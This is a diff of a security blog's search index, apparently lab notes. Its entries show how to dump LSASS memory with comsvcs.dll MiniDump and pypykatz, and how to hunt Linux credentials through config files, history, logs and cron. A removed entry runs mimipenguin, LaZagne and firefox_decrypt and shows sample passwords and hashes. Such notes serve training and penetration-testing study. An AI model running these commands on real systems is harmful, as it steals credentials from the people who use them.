@@ -38,6 +38,32 @@
       </tags>
   </entry>
   <entry>
+    <title>Dump Lsass</title>
+    <url>/2025/11/26/Dump-Lsass/</url>
+    <content><![CDATA[<h2 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h2><h3 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h3><p>Select the process from task manager </p>
+<p><img src="/img/task-manager.png" alt="Select the process"></p>
+<p>Create a dump file</p>
+<p><img src="/img/dump-lsass.png" alt="dump lsass"></p>
+<p>➜ And then we can find the created file on &#96;C:\Users\username\AppData\Local\Temp\Lsass.DMP.</p>
+<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><h4 id="Finding-LSASS’s-PID-in-PowerShell"><a href="#Finding-LSASS’s-PID-in-PowerShell" class="headerlink" title="Finding LSASS’s PID in PowerShell"></a>Finding LSASS’s PID in PowerShell</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Get-Process</span> lsass</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="built_in">SI</span> ProcessName</span><br><span class="line"><span class="literal">-------</span>  <span class="literal">------</span>    <span class="literal">-----</span>      <span class="literal">-----</span>     <span class="literal">------</span>     <span class="literal">--</span>  <span class="literal">--</span> <span class="literal">-----------</span></span><br><span class="line">   <span class="number">1260</span>      <span class="number">21</span>     <span class="number">4948</span>      <span class="number">15396</span>       <span class="number">2.56</span>    <span class="number">672</span>   <span class="number">0</span> lsass</span><br></pre></td></tr></table></figure>
+
+<h4 id="Creating-a-dump-file-using-PowerShell"><a href="#Creating-a-dump-file-using-PowerShell" class="headerlink" title="Creating a dump file using PowerShell"></a>Creating a dump file using PowerShell</h4><p>➜ We need <code>Administrator access</code>.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump <span class="number">672</span> C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Dump-Lsass-Offline"><a href="#Dump-Lsass-Offline" class="headerlink" title="Dump Lsass Offline"></a>Dump Lsass Offline</h2><p>➜ After creating a dump file, we can now dump the lsass file offline :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.dmp </span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump-Lsass</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DPAPI</title>
     <url>/2025/11/26/DPAPI/</url>
     <content><![CDATA[<h2 id="Default-Location"><a href="#Default-Location" class="headerlink" title="Default Location"></a>Default Location</h2><p>Credentials are stored in special encrypted folders on the computer under the user and system profiles : </p>
@@ -91,32 +117,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Dump Lsass</title>
-    <url>/2025/11/26/Dump-Lsass/</url>
-    <content><![CDATA[<h2 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h2><h3 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h3><p>Select the process from task manager </p>
-<p><img src="/img/task-manager.png" alt="Select the process"></p>
-<p>Create a dump file</p>
-<p><img src="/img/dump-lsass.png" alt="dump lsass"></p>
-<p>➜ And then we can find the created file on &#96;C:\Users\username\AppData\Local\Temp\Lsass.DMP.</p>
-<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><h4 id="Finding-LSASS’s-PID-in-PowerShell"><a href="#Finding-LSASS’s-PID-in-PowerShell" class="headerlink" title="Finding LSASS’s PID in PowerShell"></a>Finding LSASS’s PID in PowerShell</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Get-Process</span> lsass</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="built_in">SI</span> ProcessName</span><br><span class="line"><span class="literal">-------</span>  <span class="literal">------</span>    <span class="literal">-----</span>      <span class="literal">-----</span>     <span class="literal">------</span>     <span class="literal">--</span>  <span class="literal">--</span> <span class="literal">-----------</span></span><br><span class="line">   <span class="number">1260</span>      <span class="number">21</span>     <span class="number">4948</span>      <span class="number">15396</span>       <span class="number">2.56</span>    <span class="number">672</span>   <span class="number">0</span> lsass</span><br></pre></td></tr></table></figure>
-
-<h4 id="Creating-a-dump-file-using-PowerShell"><a href="#Creating-a-dump-file-using-PowerShell" class="headerlink" title="Creating a dump file using PowerShell"></a>Creating a dump file using PowerShell</h4><p>➜ We need <code>Administrator access</code>.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump <span class="number">672</span> C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Dump-Lsass-Offline"><a href="#Dump-Lsass-Offline" class="headerlink" title="Dump Lsass Offline"></a>Dump Lsass Offline</h2><p>➜ After creating a dump file, we can now dump the lsass file offline :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.dmp </span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
-      </categories>
-      <tags>
-        <tag>Dump-Lsass</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Dump NTDS</title>
     <url>/2025/11/26/Dump-NTDS/</url>
     <content><![CDATA[<p>➜ Required privilege </p>
@@ -151,6 +151,44 @@
       </categories>
       <tags>
         <tag>Dump-NTDS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux Credential Hunting</title>
+    <url>/2025/11/27/Linux-Credential-Hunting/</url>
+    <content><![CDATA[<h1 id="Linux-Credential-Hunting"><a href="#Linux-Credential-Hunting" class="headerlink" title="Linux Credential Hunting"></a>Linux Credential Hunting</h1><h3 id="Enumerating-history-files"><a href="#Enumerating-history-files" class="headerlink" title="Enumerating history files"></a>Enumerating history files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n10 /home/*/.bash*</span><br></pre></td></tr></table></figure>
+
+<h3 id="Searching-for-configuration-files"><a href="#Searching-for-configuration-files" class="headerlink" title="Searching for configuration files"></a>Searching for configuration files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.conf .config .cnf&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;lib\|fonts\|share\|core&quot;</span> ;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Searching-for-Passwords-in-Configuration-Files"><a href="#Searching-for-Passwords-in-Configuration-Files" class="headerlink" title="Searching for Passwords in Configuration Files"></a>Searching for Passwords in Configuration Files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(find / -<span class="built_in">type</span> f \( -iname <span class="string">&quot;*.txt&quot;</span> -o -iname <span class="string">&quot;*.ini&quot;</span> -o -iname <span class="string">&quot;*.cfg&quot;</span> -o -iname <span class="string">&quot;*.config&quot;</span> -o -iname <span class="string">&quot;*.xml&quot;</span> -o -iname <span class="string">&quot;*.yml&quot;</span> -o -iname <span class="string">&quot;*.yaml&quot;</span> -o -iname <span class="string">&quot;*.cnf&quot;</span> -o -iname <span class="string">&quot;*.conf&quot;</span> -o -iname <span class="string">&quot;*.sh&quot;</span> -o -iname <span class="string">&quot;*.py&quot;</span> -o -iname <span class="string">&quot;*.php&quot;</span> -o -iname <span class="string">&quot;*.git&quot;</span> -o -iname <span class="string">&quot;*.json&quot;</span> \) 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib&quot;</span>); <span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile: <span class="variable">$i</span>&quot;</span>; grep -Ei <span class="string">&quot;password|passphrase|key|username|user account|creds|users|passkeys|configuration|dbcredential|dbpassword|pwd|login|credentials&quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> 2&gt;/dev/null | grep -Ev <span class="string">&quot;^\s*#&quot;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Searching-for-databases"><a href="#Searching-for-databases" class="headerlink" title="Searching for databases"></a>Searching for databases</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.sql .db .*db .db*&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nDB File extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib\|headers\|share\|man&quot;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Searching-for-scripts"><a href="#Searching-for-scripts" class="headerlink" title="Searching for scripts"></a>Searching for scripts</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.py .pyc .pl .go .jar .c .sh&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib\|headers\|share&quot;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Searching-for-notes"><a href="#Searching-for-notes" class="headerlink" title="Searching for notes"></a>Searching for notes</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /home/* -<span class="built_in">type</span> f -name <span class="string">&quot;*.txt&quot;</span> -o ! -name <span class="string">&quot;*.*&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Enumerating-log-files"><a href="#Enumerating-log-files" class="headerlink" title="Enumerating log files"></a>Enumerating log files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">ls</span> /var/log/* 2&gt;/dev/null);<span class="keyword">do</span> GREP=$(grep <span class="string">&quot;accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs&quot;</span> <span class="variable">$i</span> 2&gt;/dev/null); <span class="keyword">if</span> [[ <span class="variable">$GREP</span> ]];<span class="keyword">then</span> <span class="built_in">echo</span> -e <span class="string">&quot;\n#### Log file: &quot;</span> <span class="variable">$i</span>; grep <span class="string">&quot;accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs&quot;</span> <span class="variable">$i</span> 2&gt;/dev/null;<span class="keyword">fi</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Enumerating-cronjobs"><a href="#Enumerating-cronjobs" class="headerlink" title="Enumerating cronjobs"></a>Enumerating cronjobs</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab </span><br><span class="line"></span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /etc/cron.*/</span><br><span class="line"></span><br><span class="line">/etc/cron.d/:</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 1 root root  106  3. Jan 20:27 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all</span><br><span class="line">-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate</span><br><span class="line">-rw-r--r-- 1 root root  607 25. Jan 2021  john</span><br><span class="line">-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm</span><br><span class="line">-rw-r--r-- 1 root root  712 11. Mai 2020  php</span><br><span class="line">-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder</span><br><span class="line">-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat</span><br><span class="line"></span><br><span class="line">/etc/cron.daily/:</span><br><span class="line">total 68</span><br><span class="line">drwxr-xr-x 1 root root  252  6. Jan 16:24 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post-Exploitation</category>
+        <category>Credential Hunting</category>
+      </categories>
+      <tags>
+        <tag>config-files</tag>
+        <tag>history-file</tag>
+        <tag>db-files</tag>
+        <tag>cronjobs-enumeration</tag>
       </tags>
   </entry>
   <entry>
@@ -193,11 +231,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux Pass the Hash (PtH)</title>
-    <url>/2025/11/27/Linux-Pass-the-Hash-PtH/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>Linux Memory-Cache-Browser Credentials Hunting</title>
     <url>/2025/11/27/Linux-Memory-Cache-Browser-Credentials-Hunting/</url>
     <content><![CDATA[<h2 id="Mimipenguin-root-access-is-required"><a href="#Mimipenguin-root-access-is-required" class="headerlink" title="Mimipenguin ( root access is required )"></a>Mimipenguin ( root access is required )</h2><p>➜ Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.</p>
@@ -234,39 +267,9 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux Memory-Cache-Browser Credentials Hunting</title>
-    <url>/2025/11/27/Memory-and-cache/</url>
-    <content><![CDATA[<h2 id="Mimipenguin-root-access-is-required"><a href="#Mimipenguin-root-access-is-required" class="headerlink" title="Mimipenguin ( root access is required )"></a>Mimipenguin ( root access is required )</h2><p>➜ Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 mimipenguin.py</span><br><span class="line"></span><br><span class="line">[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY</span><br></pre></td></tr></table></figure>
-
-<h2 id="LaZagne-Root-recommended-but-not-always-required"><a href="#LaZagne-Root-recommended-but-not-always-required" class="headerlink" title="LaZagne ( Root recommended, but not always required )"></a>LaZagne ( Root recommended, but not always required )</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python2.7 laZagne.py all</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------------- Shadow passwords -----------------</span><br><span class="line"></span><br><span class="line">[+] Hash found !!!</span><br><span class="line">Login: systemd-coredump</span><br><span class="line">Hash: !!:18858::::::</span><br><span class="line"></span><br><span class="line">[+] Hash found !!!</span><br><span class="line">Login: sambauser</span><br><span class="line">Hash: $6<span class="variable">$wgK4tGq7Jepa</span>.V0g<span class="variable">$QkxvseL</span>.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::</span><br><span class="line"></span><br><span class="line">[+] Password found !!!</span><br><span class="line">Login: cry0l1t3</span><br><span class="line">Password: WLpAEXFa0SbqOHY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] 3 passwords have been found.</span><br><span class="line">For more information launch it again with the -v option</span><br><span class="line"></span><br><span class="line">elapsed <span class="keyword">time</span> = 3.50091600418</span><br></pre></td></tr></table></figure>
-
-
-<p>LaZagne without root</p>
-<ul>
-<li><code>browser passwords (if user profile is readable)</code></li>
-<li><code>Git credentials</code></li>
-<li><code>SSH keys</code></li>
-<li><code>environment variables</code></li>
-<li><code>configuration files</code></li>
-</ul>
-<h2 id="Browser-redentials"><a href="#Browser-redentials" class="headerlink" title="Browser redentials"></a>Browser redentials</h2><h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><p>By default, Firefox stores saved credentials in an encrypted file named <code>logins.json</code>.</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l .mozilla/firefox/ | grep default </span><br><span class="line"></span><br><span class="line">drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release</span><br><span class="line">drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> .mozilla/firefox/1bplpd86.default-release/logins.json | jq .</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;nextId&quot;</span>: 2,</span><br><span class="line">  <span class="string">&quot;logins&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;id&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;hostname&quot;</span>: <span class="string">&quot;https://www.inlanefreight.com&quot;</span>,</span><br><span class="line">      <span class="string">&quot;httpRealm&quot;</span>: null,</span><br><span class="line">      <span class="string">&quot;formSubmitURL&quot;</span>: <span class="string">&quot;https://www.inlanefreight.com&quot;</span>,</span><br><span class="line">      <span class="string">&quot;usernameField&quot;</span>: <span class="string">&quot;username&quot;</span>,</span><br><span class="line">      <span class="string">&quot;passwordField&quot;</span>: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encryptedUsername&quot;</span>: <span class="string">&quot;MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encryptedPassword&quot;</span>: <span class="string">&quot;MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=&quot;</span>,</span><br><span class="line">      <span class="string">&quot;guid&quot;</span>: <span class="string">&quot;&#123;412629aa-4113-4ff9-befe-dd9b4ca388e2&#125;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encType&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;timeCreated&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timeLastUsed&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timePasswordChanged&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timesUsed&quot;</span>: 1</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;potentiallyVulnerablePasswords&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;dismissedBreachAlertsByLoginGUID&quot;</span>: &#123;&#125;,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: 3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="Decrypt"><a href="#Decrypt" class="headerlink" title="Decrypt"></a>Decrypt</h4><p>To decrypt saved credentials we can use <a href="https://github.com/unode/firefox_decrypt">firefox_decrypt</a></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3.9 firefox_decrypt.py</span><br><span class="line"></span><br><span class="line">Select the Mozilla profile you wish to decrypt</span><br><span class="line">1 -&gt; lfx3lvhb.default</span><br><span class="line">2 -&gt; 1bplpd86.default-release</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">Website:   https://testing.dev.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line">Website:   https://www.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;cry0l1t3&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;FzXUxJemKm6g2lGh&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Linux</category>
-        <category>Post-Exploitation</category>
-        <category>Credential Hunting</category>
-      </categories>
-      <tags>
-        <tag>browser-credentials</tag>
-        <tag>LaZagne</tag>
-        <tag>Mimipenguin</tag>
-      </tags>
+    <title>Linux Pass the Hash (PtH)</title>
+    <url>/2025/11/27/Linux-Pass-the-Hash-PtH/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>Mssql Enumeration</title>
@@ -320,44 +323,6 @@
       <tags>
         <tag>Enumeration</tag>
         <tag>MSSQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux Credential Hunting</title>
-    <url>/2025/11/27/Linux-Credential-Hunting/</url>
-    <content><![CDATA[<h1 id="Linux-Credential-Hunting"><a href="#Linux-Credential-Hunting" class="headerlink" title="Linux Credential Hunting"></a>Linux Credential Hunting</h1><h3 id="Enumerating-history-files"><a href="#Enumerating-history-files" class="headerlink" title="Enumerating history files"></a>Enumerating history files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n10 /home/*/.bash*</span><br></pre></td></tr></table></figure>
-
-<h3 id="Searching-for-configuration-files"><a href="#Searching-for-configuration-files" class="headerlink" title="Searching for configuration files"></a>Searching for configuration files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.conf .config .cnf&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;lib\|fonts\|share\|core&quot;</span> ;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Searching-for-Passwords-in-Configuration-Files"><a href="#Searching-for-Passwords-in-Configuration-Files" class="headerlink" title="Searching for Passwords in Configuration Files"></a>Searching for Passwords in Configuration Files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(find / -<span class="built_in">type</span> f \( -iname <span class="string">&quot;*.txt&quot;</span> -o -iname <span class="string">&quot;*.ini&quot;</span> -o -iname <span class="string">&quot;*.cfg&quot;</span> -o -iname <span class="string">&quot;*.config&quot;</span> -o -iname <span class="string">&quot;*.xml&quot;</span> -o -iname <span class="string">&quot;*.yml&quot;</span> -o -iname <span class="string">&quot;*.yaml&quot;</span> -o -iname <span class="string">&quot;*.cnf&quot;</span> -o -iname <span class="string">&quot;*.conf&quot;</span> -o -iname <span class="string">&quot;*.sh&quot;</span> -o -iname <span class="string">&quot;*.py&quot;</span> -o -iname <span class="string">&quot;*.php&quot;</span> -o -iname <span class="string">&quot;*.git&quot;</span> -o -iname <span class="string">&quot;*.json&quot;</span> \) 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib&quot;</span>); <span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile: <span class="variable">$i</span>&quot;</span>; grep -Ei <span class="string">&quot;password|passphrase|key|username|user account|creds|users|passkeys|configuration|dbcredential|dbpassword|pwd|login|credentials&quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> 2&gt;/dev/null | grep -Ev <span class="string">&quot;^\s*#&quot;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Searching-for-databases"><a href="#Searching-for-databases" class="headerlink" title="Searching for databases"></a>Searching for databases</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.sql .db .*db .db*&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nDB File extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib\|headers\|share\|man&quot;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Searching-for-scripts"><a href="#Searching-for-scripts" class="headerlink" title="Searching for scripts"></a>Searching for scripts</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.py .pyc .pl .go .jar .c .sh&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib\|headers\|share&quot;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Searching-for-notes"><a href="#Searching-for-notes" class="headerlink" title="Searching for notes"></a>Searching for notes</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /home/* -<span class="built_in">type</span> f -name <span class="string">&quot;*.txt&quot;</span> -o ! -name <span class="string">&quot;*.*&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Enumerating-log-files"><a href="#Enumerating-log-files" class="headerlink" title="Enumerating log files"></a>Enumerating log files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">ls</span> /var/log/* 2&gt;/dev/null);<span class="keyword">do</span> GREP=$(grep <span class="string">&quot;accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs&quot;</span> <span class="variable">$i</span> 2&gt;/dev/null); <span class="keyword">if</span> [[ <span class="variable">$GREP</span> ]];<span class="keyword">then</span> <span class="built_in">echo</span> -e <span class="string">&quot;\n#### Log file: &quot;</span> <span class="variable">$i</span>; grep <span class="string">&quot;accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs&quot;</span> <span class="variable">$i</span> 2&gt;/dev/null;<span class="keyword">fi</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Enumerating-cronjobs"><a href="#Enumerating-cronjobs" class="headerlink" title="Enumerating cronjobs"></a>Enumerating cronjobs</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab </span><br><span class="line"></span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br></pre></td></tr></table></figure>
-
-
